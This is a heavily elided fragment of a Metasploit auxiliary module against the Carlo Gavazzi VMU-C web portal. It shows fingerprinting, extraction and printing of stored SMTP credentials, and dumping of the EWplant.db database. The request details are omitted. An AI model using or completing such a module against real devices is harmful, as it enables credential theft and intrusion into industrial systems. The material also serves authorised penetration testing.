...
class MetasploitModule < Msf::Auxiliary
  ...
  def is_app_carlogavazzi?
    ...
    if good_response
      vprint_good("Running Carlo Gavazzi VMU-C Web Management portal...")
      return true
    else
      vprint_error("Application is not Carlo Gavazzi. Module will not continue.")
      return false
    end
  end
    ...
    if good_response
      ...
      if res && res.code == 200
        if res.body.include?('Firmware Version') || res.body.include?('Versione Firmware')
          ...
          if !fw_ver.nil?
            print_good("Firmware version #{fw_ver}...")
      ...
      if (res && res.code == 200 && res.body.include?('SMTP'))
        ...
        if (!dirty_smtp_server.nil?) && (!dirty_smtp_user.nil?) && (!dirty_smtp_pass.nil?)
          ...
          if (!smtp_server.nil?) && (!smtp_user.nil?) && (!smtp_pass.nil?)
            print_good("SMTP server: #{smtp_server}, SMTP username: #{smtp_user}, SMTP password: #{smtp_pass}")
          end
        end
      else
        vprint_error("SMTP config could not be retrieved. Check if the user has administrative privileges")
      end
      return :next_user
    else
  ...
  def ewplantdb
    ...
    if res && res.code == 200
      print_status("dumping EWplant.db")
      print_good("EWplant.db retrieved successfully!")
      ...
      vprint_error("Failed to retrieve EWplant.db. Set a higher HTTPCLIENTTIMEOUT and try again. Else, check if target is running vulnerable version.?")
      return
    end
  end
end
